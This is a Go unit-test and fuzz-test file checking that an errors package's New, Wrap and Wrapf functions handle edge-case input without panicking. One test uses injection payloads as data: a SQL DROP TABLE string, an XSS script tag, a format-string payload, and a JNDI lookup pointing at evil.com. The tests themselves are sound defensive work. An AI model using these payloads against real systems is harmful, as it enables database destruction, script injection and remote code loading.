package errors

import (
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestError_NullByteInMessage verifies that null bytes in error messages do not cause panics.
func TestError_NullByteInMessage(t *testing.T) {
	t.Parallel()

	err := New("message\x00with\x00nulls")

	require.Error(t, err)
	assert.Contains(t, err.Error(), "message")
}

// TestError_DeepWrapping verifies that 1000 levels of wrapping do not panic or overflow.
func TestError_DeepWrapping(t *testing.T) {
	t.Parallel()

	base := fmt.Errorf("base")
	err := base
	for range 1000 {
		err = Wrap(err, "layer")
	}

	require.Error(t, err)
	assert.ErrorIs(t, err, base)
}

// TestError_EmptyMessage verifies that an empty message produces a valid error.
func TestError_EmptyMessage(t *testing.T) {
	t.Parallel()

	err := New("")

	require.Error(t, err)
}

// TestError_LargeMessage verifies that a 10MB error message does not panic.
func TestError_LargeMessage(t *testing.T) {
	t.Parallel()

	large := strings.Repeat("x", 10*1024*1024)
	err := New(large)

	require.Error(t, err)
	assert.GreaterOrEqual(t, len(err.Error()), 10*1024*1024)
}

// TestError_SpecialCharsInMessage verifies that SQL and HTML injection strings do not panic.
func TestError_SpecialCharsInMessage(t *testing.T) {
	t.Parallel()
	payloads := []string{
		"'; DROP TABLE users; --",
		`<script>alert("xss")</script>`,
		"${jndi:ldap://evil.com/a}",
		"%s%s%s%s%s%s%s%s%s%s",
		"\t\n\r\x00\x1b[31m",
	}
	for _, payload := range payloads {
		err := New(payload)
		require.Error(t, err, "payload: %q", payload)

		// Wrap the injection string as well.
		wrapped := Wrap(err, "context: "+payload)
		require.Error(t, wrapped, "payload: %q", payload)
	}
}

// FuzzErrorMessage fuzzes error creation and wrapping with arbitrary strings.
func FuzzErrorMessage(f *testing.F) {
	f.Add("simple")
	f.Add("")
	f.Add("\x00")
	f.Add(strings.Repeat("a", 10000))
	f.Add("'; DROP TABLE users; --")
	f.Add("%s %d %v")

	f.Fuzz(func(t *testing.T, msg string) {
		// Must not panic.
		err := New(msg)
		require.Error(t, err)
		_ = err.Error()

		base := fmt.Errorf("base")
		wrapped := Wrap(base, msg)
		require.Error(t, wrapped)
		_ = wrapped.Error()

		formatted := Wrapf(base, "prefix: %s", msg)
		require.Error(t, formatted)
		_ = formatted.Error()
	})
}
